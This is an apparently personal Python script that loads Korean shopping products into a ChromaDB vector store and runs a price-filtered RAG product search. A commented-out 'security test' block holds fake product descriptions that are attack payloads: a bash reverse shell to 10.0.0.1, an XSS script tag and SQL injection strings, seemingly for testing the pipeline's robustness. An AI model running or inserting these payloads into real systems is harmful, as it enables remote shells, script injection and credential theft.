import chromadb
from sentence_transformers import SentenceTransformer
import csv
from collections import Counter

# 1. 임베딩 모델 로드 (가벼운 모델 추천)
embed_model = SentenceTransformer('jhgan/ko-sroberta-multitask')

# 2. 크로마 DB 초기화 (로컬 저장소)
client = chromadb.PersistentClient(path="D:/PJ/AI_Aegis_PJ(개인)/Database/product_db")
collection = client.get_or_create_collection(name="shopping_items")

# 3. 상품 데이터 샘플 저장 함수
def add_product(p_id, name, desc, category, price):
    # '이름 + 설명'을 합쳐서 벡터화 (완벽한 검색을 위한 팁)
    combined_text = f"[{category}] {name}: {desc}"
    vector = embed_model.encode(combined_text).tolist()
    
    collection.add(\
        ids=[p_id],
        embeddings=[vector],
        metadatas=[{"name": name, "category": category, "price": price, "desc": desc}]
    )
    # print(f"✅ {name} 저장 완료!")

# 최초 DB 없을시 TEST 상품 추가
# # [테스트용 다양한 카테고리 상품 리스트]
# add_product("P001", "오덴세 식기세트", "신혼부부에게 인기 있는 모던한 디자인의 식기 세트", "주방용품", 55000)
# add_product("P002", "샤오미 핸디 청소기", "차량용이나 자취방에서 쓰기 좋은 컴팩트한 무선 청소기", "생활가전", 42000)

# # 1. 수리/공구 (아까 화장대 파손 상황 테스트용)
# add_product("P003", "록타이트 401 순간접착제", "목재, 플라스틱, 금속 등 다양한 재질을 강력하게 붙이는 다용도 접착제", "수리용품", 3500)
# add_product("P004", "우드 필러 메꿈이", "가구의 패인 홈이나 갈라진 틈을 자연스럽게 메워주는 목재 보수재", "수리용품", 8900)

# # 2. 주방/식기 (집들이 선물 테스트용)
# add_product("P005", "모던하우스 우드 커트러리 세트", "따뜻한 나무 질감의 숟가락과 젓가락 세트로 감성적인 식탁 연출 가능", "주방용품", 15900)
# add_product("P006", "조셉조셉 인덱스 도마 세트", "용도별로 구분된 위생적인 도마 세트와 보관 케이스", "주방용품", 45000)

# # 3. 생활/가전 (성능 테스트용)
# add_product("P007", "루메나 무선 미니 가습기", "책상 위에 두기 좋은 컴팩트한 사이즈의 무선 가습기", "생활가전", 29800)
# add_product("P008", "필립스 보풀제거기", "강력한 칼날로 옷감 손상 없이 보풀을 깔끔하게 제거하는 휴대용 기기", "생활가전", 19500)

# # 4. 가구/인테리어 (대체 상품 추천용)
# add_product("P009", "이케아 레르베리 철제 선반", "좁은 공간에서도 효율적으로 물건을 수납할 수 있는 가성비 선반", "가구", 17900)
# add_product("P010", "양키캔들 워머 세트", "불 없이 안전하게 향기를 즐길 수 있는 캔들 워머와 캔들 구성", "인테리어", 39000)

# # 5. 수납/정리 (화장대 대체품 테스트용)
# add_product("P011", "무인양품 아크릴 3단 서랍장", "투명해서 내용물 확인이 쉽고 화장품 정리하기 좋은 미니 서랍", "수납용품", 25000)
# add_product("P012", "이동식 3단 트롤리", "주방, 거실, 화장대 옆 어디서든 쓰기 좋은 바퀴 달린 수납함", "수납용품", 32000)

# print("\n✨ 상품이 DB에 추가되었습니다!")

# 보안 TEST 용 임의 상품 추가
# add_product("A001", "티셔츠 디버깅 킷", "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1", "보안", 100)
# add_product("A002", "신발 보안 취약점 테스트",  "<script>alert('System_Hacked');</script>", "보안", 200)
# add_product("A003", "양말 디버깅 킷",  "admin' OR '1'='1", "보안", 300)
# add_product("A004", "넥타이 보안 취약점 테스트",  "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1", "보안", 400)
# add_product("A005", "모자 시스템 관리 도구",  "UNION SELECT null, username, password FROM members--", "보안", 500)

# 4. CSV 데이터 일괄 저장 (위에서 만든 파일을 읽어옴)
def load_products_from_csv(file_path):
    with open(file_path, mode='r', encoding='cp949') as f:
        reader = csv.DictReader(f)
        for row in reader:
            add_product(
                p_id=row['id'],
                name=row['name'],
                desc=row['desc'],
                category=row['category'],
                price=int(row['price'])
            )

# 실행
load_products_from_csv("D:\PJ\AI_Aegis_PJ(개인)\Database\상품리스트.csv")


# 5. RAG 검색 함수
def search_rag(query_text, max_price=None):
    query_vector = embed_model.encode(query_text).tolist()
    
    # 메타데이터 필터링 적용 (가격 조건이 있을 경우)
    where_clause = {"price": {"$lte": max_price}} if max_price else None
    
    results = collection.query(
        query_embeddings=[query_vector],
        n_results=3,
        where=where_clause
    )
    return results['metadatas'][0]

# "5만원 이하 청소기" 검색 시나리오
search_result = search_rag("방 청소할 때 쓸만한 가벼운 청소기", max_price=50000)
print(f"\n🔍 검색된 상품: {search_result}")
#%%
# 별도 실행 구간
# ========== 전체 데이터 확인 =============
# 아이디만 확인
all_data = collection.get()
print(all_data['ids'])

# 카테고리 별 데이터 개수 확인
metas = collection.get(include=['metadatas'])['metadatas']
counts = Counter(m['category'] for m in metas)
print(f"[{', '.join(f'{k}: {v}' for k, v in counts.items())}]")

# 상세리스트 확인
for metadata in all_data['metadatas']:
    print(metadata)
#%%
# 리스트 삭제
# 'P012' ID를 가진 상품 삭제
collection.delete(ids=["P214"])

# 카테고리 전체 삭제
collection.delete(where={"category": "반려동물용품"})
